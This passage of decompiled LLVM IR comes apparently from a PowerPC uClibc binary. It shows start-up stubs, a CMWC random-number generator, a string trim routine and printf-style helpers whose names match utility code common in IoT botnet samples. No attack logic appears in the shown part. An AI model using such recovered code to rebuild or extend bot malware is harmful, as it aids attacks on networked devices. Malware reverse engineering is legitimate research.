  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_10028010.7, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_10028010.7 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268481324, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268519312, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10028650.8, align 4
  %v1_10000260 = add i32 %arg1, -1640531527
  store i32 %v1_10000260, i32* @global_var_10028654.9, align 4
  %v1_10000278 = add i32 %arg1, 1013904242
  store i32 %v1_10000278, i32* @global_var_10028658.10, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %entry, %dec_label_pc_10000294
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_100002fc, %dec_label_pc_10000294 ]
  %v1_1000029c = mul i32 %storemerge12, 4
  %v2_100002ac = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_10028650.8 to i32), i32 -12)
  %v1_100002b0 = inttoptr i32 %v2_100002ac to i32*
  %v2_100002b0 = load i32, i32* %v1_100002b0, align 4
  %v2_100002c8 = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_10028650.8 to i32), i32 -8)
  %v1_100002cc = inttoptr i32 %v2_100002c8 to i32*
  %v2_100002cc = load i32, i32* %v1_100002cc, align 4
  %v2_100002d0 = xor i32 %storemerge12, -1640531527
  %v2_100002d8 = xor i32 %v2_100002d0, %v2_100002b0
  %v1_100002e0 = xor i32 %v2_100002d8, %v2_100002cc
  %v2_100002f0 = add i32 %v1_1000029c, ptrtoint (i32* @global_var_10028650.8 to i32)
  %v2_100002f4 = inttoptr i32 %v2_100002f0 to i32*
  store i32 %v1_100002e0, i32* %v2_100002f4, align 4
  %v1_100002fc = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_100002fc, 4096
  br i1 %tmp7, label %dec_label_pc_10000294, label %dec_label_pc_10000310

dec_label_pc_10000310:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000029c, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000348 = load i32, i32* @global_var_1002823c.11, align 4
  %v1_1000034c = add i32 %v3_10000348, 1
  %v1_10000350 = urem i32 %v1_1000034c, 4096
  store i32 %v1_10000350, i32* @global_var_1002823c.11, align 4
  %v1_1000036c = mul nuw nsw i32 %v1_10000350, 4
  %v2_10000370 = add i32 %v1_1000036c, ptrtoint (i32* @global_var_10028650.8 to i32)
  %v1_10000374 = inttoptr i32 %v2_10000370 to i32*
  %v2_10000374 = load i32, i32* %v1_10000374, align 4
  %v6_10000398 = udiv i32 %v2_10000374, 228675
  %v2_1000039c = mul i32 %v2_10000374, 18782
  %v3_100003ac = load i32, i32* @global_var_10028238.12, align 4
  %v2_100003b8 = add i32 %v3_100003ac, %v2_1000039c
  %v3_100003b8 = icmp ult i32 %v2_100003b8, %v3_100003ac
  %v4_100003bc = zext i1 %v3_100003b8 to i32
  %v5_100003bc = add nuw nsw i32 %v4_100003bc, %v6_10000398
  store i32 %v5_100003bc, i32* %r10.global-to-local, align 4
  %v2_100003ec = add i32 %v5_100003bc, %v2_100003b8
  %v2_10000400 = icmp ult i32 %v2_100003ec, %v5_100003bc
  br i1 %v2_10000400, label %dec_label_pc_10000408, label %dec_label_pc_10000428

dec_label_pc_10000408:                            ; preds = %entry
  %v1_1000040c = add i32 %v2_100003ec, 1
  %v1_1000041c = add nuw nsw i32 %v5_100003bc, 1
  br label %dec_label_pc_10000428

dec_label_pc_10000428:                            ; preds = %entry, %dec_label_pc_10000408
  %storemerge = phi i32 [ %v1_1000041c, %dec_label_pc_10000408 ], [ %v5_100003bc, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_1000040c, %dec_label_pc_10000408 ], [ %v2_100003ec, %entry ]
  store i32 %storemerge, i32* @global_var_10028238.12, align 4
  store i32 %v1_10000350, i32* %r10.global-to-local, align 4
  %v2_10000438 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000438, i32* %v1_10000374, align 4
  %v0_10000458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10000458 = mul i32 %v0_10000458, 4
  %v2_1000045c = add i32 %v1_10000458, ptrtoint (i32* @global_var_10028650.8 to i32)
  %v1_10000460 = inttoptr i32 %v2_1000045c to i32*
  %v2_10000460 = load i32, i32* %v1_10000460, align 4
  ret i32 %v2_10000460

; uselistorder directives
  uselistorder i32 %v5_100003bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100003ac, { 1, 0 }
  uselistorder i32 %v2_10000374, { 1, 0 }
  uselistorder i32 %v1_10000350, { 2, 0, 1 }
  uselistorder i32* @global_var_10028650.8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10028650.8 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000428, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000049c = call i32 @__GI_strlen()
  store i32 %v0_1000049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100004c0

dec_label_pc_100004b4:                            ; preds = %dec_label_pc_100004c0
  %v1_100004b8 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_100004c0

dec_label_pc_100004c0:                            ; preds = %entry, %dec_label_pc_100004b4
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100004b8, %dec_label_pc_100004b4 ]
  %v2_100004cc = add i32 %stack_var_-36.0, %arg1
  %v3_100004cc = inttoptr i32 %v2_100004cc to i8*
  %v3_100004d0 = load i8, i8* %v3_100004cc, align 1
  %v4_100004d0 = zext i8 %v3_100004d0 to i32
  store i32 %v4_100004d0, i32* %r3.global-to-local, align 4
  %v3_100004e0 = call i32 @isspace(i32 %v4_100004d0, i32 %v2_100004cc)
  store i32 %v3_100004e0, i32* %r3.global-to-local, align 4
  %v3_100004e8 = icmp eq i32 %v3_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000500.preheader, label %dec_label_pc_100004b4

dec_label_pc_10000500.preheader:                  ; preds = %dec_label_pc_100004c0
  %v1_100004a8 = add i32 %v0_1000049c, -1
  %v2_100005087 = icmp slt i32 %v1_100004a8, %stack_var_-36.0
  br i1 %v2_100005087, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_100004f4:                            ; preds = %dec_label_pc_10000510
  %v1_100004f8 = add i32 %stack_var_-40.010, -1
  %v2_10000508 = icmp slt i32 %v1_100004f8, %stack_var_-36.0
  br i1 %v2_10000508, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_10000500.preheader, %dec_label_pc_100004f4
  %stack_var_-40.010 = phi i32 [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %v1_100004a8, %dec_label_pc_10000500.preheader ]
  %v2_1000051c = add i32 %stack_var_-40.010, %arg1
  %v3_1000051c = inttoptr i32 %v2_1000051c to i8*
  %v3_10000520 = load i8, i8* %v3_1000051c, align 1
  %v4_10000520 = zext i8 %v3_10000520 to i32
  store i32 %v4_10000520, i32* %r3.global-to-local, align 4
  %v3_10000530 = call i32 @isspace(i32 %v4_10000520, i32 %v2_1000051c)
  store i32 %v3_10000530, i32* %r3.global-to-local, align 4
  %v3_10000538 = icmp eq i32 %v3_10000530, 0
  br i1 %v3_10000538, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_100004f4

dec_label_pc_1000058c.preheader:                  ; preds = %dec_label_pc_100004f4, %dec_label_pc_10000510, %dec_label_pc_10000500.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_100004a8, %dec_label_pc_10000500.preheader ], [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %stack_var_-40.010, %dec_label_pc_10000510 ]
  %v3_100005943 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100005943, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_1000058c.preheader, %dec_label_pc_1000054c
  %v2_100005b06 = phi i32 [ %v2_100005b0, %dec_label_pc_1000054c ], [ %arg1, %dec_label_pc_1000058c.preheader ]
  %storemerge15 = phi i32 [ %v1_10000584, %dec_label_pc_1000054c ], [ %stack_var_-36.0, %dec_label_pc_1000058c.preheader ]
  %v2_10000570 = add i32 %storemerge15, %arg1
  %v1_10000574 = inttoptr i32 %v2_10000570 to i8*
  %v2_10000574 = load i8, i8* %v1_10000574, align 1
  %v3_1000057c = inttoptr i32 %v2_100005b06 to i8*
  store i8 %v2_10000574, i8* %v3_1000057c, align 1
  %v1_10000584 = add i32 %storemerge15, 1
  %v3_10000594 = icmp sgt i32 %v1_10000584, %stack_var_-40.0.lcssa
  %v2_100005a4 = sub i32 %v1_10000584, %stack_var_-36.0
  %v2_100005b0 = add i32 %v2_100005a4, %arg1
  br i1 %v3_10000594, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_1000054c, %dec_label_pc_1000058c.preheader
  %v2_100005b0.lcssa = phi i32 [ %arg1, %dec_label_pc_1000058c.preheader ], [ %v2_100005b0, %dec_label_pc_1000054c ]
  %v3_100005b8 = inttoptr i32 %v2_100005b0.lcssa to i8*
  store i8 0, i8* %v3_100005b8, align 1
  %v0_100005d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100005d0

; uselistorder directives
  uselistorder i32 %v1_10000584, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100004a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 6, 3, 4, 5, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000054c, { 1, 0 }
  uselistorder label %dec_label_pc_1000058c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000510, { 1, 0 }
  uselistorder label %dec_label_pc_100004c0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100005e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100005f4 = icmp eq i32 %v0_100005e8, 0
  br i1 %v3_100005f4, label %dec_label_pc_10000628, label %dec_label_pc_100005fc

dec_label_pc_100005fc:                            ; preds = %entry
  %v1_10000600 = inttoptr i32 %v0_100005e8 to i32*
  %v2_10000600 = load i32, i32* %v1_10000600, align 4
  %v1_1000060c = trunc i32 %arg2 to i8
  %v3_1000060c = inttoptr i32 %v2_10000600 to i8*
  store i8 %v1_1000060c, i8* %v3_1000060c, align 1
  %v2_10000614 = load i32, i32* %v1_10000600, align 4
  %v1_10000618 = add i32 %v2_10000614, 1
  store i32 %v1_10000618, i32* %v1_10000600, align 4
  %v0_10000650.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_10000628:                            ; preds = %entry
  %v2_10000628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437052, i32* @lr, align 4
  %v2_10000638 = call i32 @__libc_write(i32 1, i32 %v2_10000628)
  store i32 %v2_10000638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_1000063c:                            ; preds = %dec_label_pc_100005fc, %dec_label_pc_10000628
  %v0_10000650 = phi i32 [ %v0_10000650.pre, %dec_label_pc_100005fc ], [ %v2_10000638, %dec_label_pc_10000628 ]
  ret i32 %v0_10000650

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000063c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp46 = icmp slt i32 %arg3, 1
  br i1 %tmp46, label %dec_label_pc_10000718, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %entry
  %v2_100006c427 = load i8, i8* %arg2, align 1
  %v3_100006cc30 = icmp eq i8 %v2_100006c427, 0
  br i1 %v3_100006cc30, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006a8:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_100006a8
  %v4_100006c032 = phi i32 [ %v1_100006b8, %dec_label_pc_100006a8 ], [ %tmp, %dec_label_pc_10000694 ]
  %stack_var_-20.031 = phi i32 [ %v1_100006ac, %dec_label_pc_100006a8 ], [ 0, %dec_label_pc_10000694 ]
  %v1_100006ac = add i32 %stack_var_-20.031, 1
  %v1_100006b8 = add i32 %v4_100006c032, 1
  %v5_100006bc = inttoptr i32 %v1_100006b8 to i8*
  %v2_100006c4 = load i8, i8* %v5_100006bc, align 1
  %v3_100006cc = icmp eq i8 %v2_100006c4, 0
  br i1 %v3_100006cc, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006d4:                            ; preds = %dec_label_pc_100006a8, %dec_label_pc_10000694
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000694 ], [ %v1_100006ac, %dec_label_pc_100006a8 ]
  %v2_100006dc = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_100006dc, label %dec_label_pc_100006f0, label %dec_label_pc_10000700

dec_label_pc_100006f0:                            ; preds = %dec_label_pc_100006d4
  %v2_100006f8 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000700

dec_label_pc_10000700:                            ; preds = %dec_label_pc_100006d4, %dec_label_pc_100006f0
  %storemerge4 = phi i32 [ %v2_100006f8, %dec_label_pc_100006f0 ], [ 0, %dec_label_pc_100006d4 ]
  %v1_10000704 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000708 = icmp eq i32 %v1_10000704, 0
  br i1 %v3_10000708, label %dec_label_pc_10000718, label %dec_label_pc_10000710

dec_label_pc_10000710:                            ; preds = %dec_label_pc_10000700
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %entry, %dec_label_pc_10000700, %dec_label_pc_10000710
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_10000700 ], [ %storemerge4, %dec_label_pc_10000710 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000700 ], [ 48, %dec_label_pc_10000710 ]
  %v1_1000071c = urem i32 %arg4, 2
  %v3_10000720 = icmp eq i32 %v1_1000071c, 0
  br i1 %v3_10000720, label %dec_label_pc_10000750.preheader, label %dec_label_pc_10000790.preheader

dec_label_pc_10000750.preheader:                  ; preds = %dec_label_pc_10000718
  %v2_1000075420 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000075420, label %dec_label_pc_1000072c.lr.ph, label %dec_label_pc_10000790.preheader

dec_label_pc_1000072c.lr.ph:                      ; preds = %dec_label_pc_10000750.preheader
  %v2_10000734 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000072c

dec_label_pc_1000072c:                            ; preds = %dec_label_pc_1000072c.lr.ph, %dec_label_pc_1000072c
  %stack_var_-32.123 = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000072c.lr.ph ], [ %v1_10000748, %dec_label_pc_1000072c ]
  %v3_10000734 = call i32 @printchar(i32* %v2_10000734, i32 %stack_var_-16.0)
  %v1_10000748 = add nsw i32 %stack_var_-32.123, -1
  %v2_10000754 = icmp sgt i32 %stack_var_-32.123, 1
  br i1 %v2_10000754, label %dec_label_pc_1000072c, label %dec_label_pc_10000790.preheader

dec_label_pc_10000790.preheader:                  ; preds = %dec_label_pc_1000072c, %dec_label_pc_10000750.preheader, %dec_label_pc_10000718
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000718 ], [ 0, %dec_label_pc_10000750.preheader ], [ %stack_var_-32.0, %dec_label_pc_1000072c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000718 ], [ %stack_var_-32.0, %dec_label_pc_10000750.preheader ], [ 0, %dec_label_pc_1000072c ]
  %v2_1000079411 = load i8, i8* %arg2, align 1
  %v3_1000079c14 = icmp eq i8 %v2_1000079411, 0
  br i1 %v3_1000079c14, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760.lr.ph

dec_label_pc_10000760.lr.ph:                      ; preds = %dec_label_pc_10000790.preheader
  %v2_10000774 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000760.lr.ph, %dec_label_pc_10000760
  %v4_1000079017 = phi i32 [ %tmp, %dec_label_pc_10000760.lr.ph ], [ %v1_10000788, %dec_label_pc_10000760 ]
  %stack_var_-36.016 = phi i8* [ %arg2, %dec_label_pc_10000760.lr.ph ], [ %v5_1000078c, %dec_label_pc_10000760 ]
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000760.lr.ph ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_10000764 = load i8, i8* %stack_var_-36.016, align 1
  %v3_10000764 = zext i8 %v2_10000764 to i32
  %v3_10000774 = call i32 @printchar(i32* %v2_10000774, i32 %v3_10000764)
  %v1_1000077c = add i32 %stack_var_-12.115, 1
  %v1_10000788 = add i32 %v4_1000079017, 1
  %v5_1000078c = inttoptr i32 %v1_10000788 to i8*
  %v2_10000794 = load i8, i8* %v5_1000078c, align 1
  %v3_1000079c = icmp eq i8 %v2_10000794, 0
  br i1 %v3_1000079c, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760

dec_label_pc_100007cc.preheader:                  ; preds = %dec_label_pc_10000760, %dec_label_pc_10000790.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000790.preheader ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_100007d06 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100007d06, label %dec_label_pc_100007a8.lr.ph, label %dec_label_pc_100007d8

dec_label_pc_100007a8.lr.ph:                      ; preds = %dec_label_pc_100007cc.preheader
  %v2_100007b0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100007a8

dec_label_pc_100007a8:                            ; preds = %dec_label_pc_100007a8.lr.ph, %dec_label_pc_100007a8
  %stack_var_-32.39 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_100007a8.lr.ph ], [ %v1_100007c4, %dec_label_pc_100007a8 ]
  %v3_100007b0 = call i32 @printchar(i32* %v2_100007b0, i32 %stack_var_-16.0)
  %v1_100007c4 = add nsw i32 %stack_var_-32.39, -1
  %v2_100007d0 = icmp sgt i32 %stack_var_-32.39, 1
  br i1 %v2_100007d0, label %dec_label_pc_100007a8, label %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge

dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge: ; preds = %dec_label_pc_100007a8
  %tmp47 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge, %dec_label_pc_100007cc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp47, %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_100007cc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100006b8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100007a8, { 1, 0 }
  uselistorder label %dec_label_pc_10000760, { 1, 0 }
  uselistorder label %dec_label_pc_1000072c, { 1, 0 }
  uselistorder label %dec_label_pc_10000718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000700, { 1, 0 }
  uselistorder label %dec_label_pc_100006a8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000844 = icmp eq i32 %arg2, 0
  br i1 %v3_10000844, label %dec_label_pc_1000084c, label %dec_label_pc_10000880

dec_label_pc_1000084c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000870 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000870 = call i32 @prints(i32 %arg1, i8* %v4_10000870, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_100009d8

dec_label_pc_10000880:                            ; preds = %entry
  %v3_10000884 = icmp eq i32 %arg4, 0
  br i1 %v3_10000884, label %dec_label_pc_100008b8, label %dec_label_pc_1000088c

dec_label_pc_1000088c:                            ; preds = %dec_label_pc_10000880
  %v3_10000890 = icmp eq i32 %arg3, 10
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008b8

dec_label_pc_10000898:                            ; preds = %dec_label_pc_1000088c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_100008b8, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000898
  %v1_100008b0 = sub i32 0, %arg2
  br label %dec_label_pc_100008b8

dec_label_pc_100008b8:                            ; preds = %dec_label_pc_1000088c, %dec_label_pc_10000898, %dec_label_pc_10000880, %dec_label_pc_100008a4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000880 ], [ %arg2, %dec_label_pc_10000898 ], [ %v1_100008b0, %dec_label_pc_100008a4 ], [ %arg2, %dec_label_pc_1000088c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000880 ], [ 0, %dec_label_pc_10000898 ], [ 1, %dec_label_pc_100008a4 ], [ 0, %dec_label_pc_1000088c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_100009445 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_100009445, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0.lr.ph

dec_label_pc_100008d0.lr.ph:                      ; preds = %dec_label_pc_100008b8
  %v2_10000900 = add i32 %arg7, -58
  br label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008d0.lr.ph, %dec_label_pc_1000090c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100008d0.lr.ph ], [ %v2_10000938, %dec_label_pc_1000090c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_100008d0.lr.ph ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v2_100008d8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_100008d8, 10
  br i1 %tmp29, label %dec_label_pc_1000090c, label %dec_label_pc_100008f8

dec_label_pc_100008f8:                            ; preds = %dec_label_pc_100008d0
  %v1_10000904 = add i32 %v2_10000900, %v2_100008d8
  br label %dec_label_pc_1000090c

dec_label_pc_1000090c:                            ; preds = %dec_label_pc_100008d0, %dec_label_pc_100008f8
  %stack_var_-32.0 = phi i32 [ %v2_100008d8, %dec_label_pc_100008d0 ], [ %v1_10000904, %dec_label_pc_100008f8 ]
  %v4_1000090c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000910 = add i32 %v4_1000090c, -1
  %v5_10000914 = inttoptr i32 %v1_10000910 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_1000092c = trunc i32 %fold to i8
  store i8 %v1_1000092c, i8* %v5_10000914, align 1
  %v2_10000938 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000944 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000944, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0

dec_label_pc_1000094c:                            ; preds = %dec_label_pc_1000090c, %dec_label_pc_100008b8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_100008b8 ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v3_10000950 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000950, label %dec_label_pc_100009b4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %dec_label_pc_1000094c
  %v3_1000095c = icmp eq i32 %arg5, 0
  br i1 %v3_1000095c, label %dec_label_pc_1000099c, label %dec_label_pc_10000964

dec_label_pc_10000964:                            ; preds = %dec_label_pc_10000958
  %v1_10000968 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_1000096c = icmp eq i32 %v1_10000968, 0
  br i1 %v3_1000096c, label %dec_label_pc_1000099c, label %dec_label_pc_10000974

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000964
  %v2_1000097c = inttoptr i32 %arg1 to i32*
  %v3_1000097c = call i32 @printchar(i32* %v2_1000097c, i32 45)
  %v1_10000990 = add i32 %arg5, -1
  br label %dec_label_pc_100009b4

dec_label_pc_1000099c:                            ; preds = %dec_label_pc_10000964, %dec_label_pc_10000958
  %v4_1000099c = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_100009a0 = add i32 %v4_1000099c, -1
  %v5_100009a4 = inttoptr i32 %v1_100009a0 to i8*
  store i8 45, i8* %v5_100009a4, align 1
  br label %dec_label_pc_100009b4

dec_label_pc_100009b4:                            ; preds = %dec_label_pc_1000094c, %dec_label_pc_10000974, %dec_label_pc_1000099c
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_1000094c ], [ %v5_100009a4, %dec_label_pc_1000099c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000974 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_1000094c ], [ %arg5, %dec_label_pc_1000099c ], [ %v1_10000990, %dec_label_pc_10000974 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_1000094c ], [ 0, %dec_label_pc_1000099c ], [ 1, %dec_label_pc_10000974 ]
  %v5_100009c4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_100009d0 = add i32 %v5_100009c4, %stack_var_-40.0
  br label %dec_label_pc_100009d8

dec_label_pc_100009d8:                            ; preds = %dec_label_pc_1000084c, %dec_label_pc_100009b4
  %storemerge = phi i32 [ %v2_100009d0, %dec_label_pc_100009b4 ], [ %v5_10000870, %dec_label_pc_1000084c ]
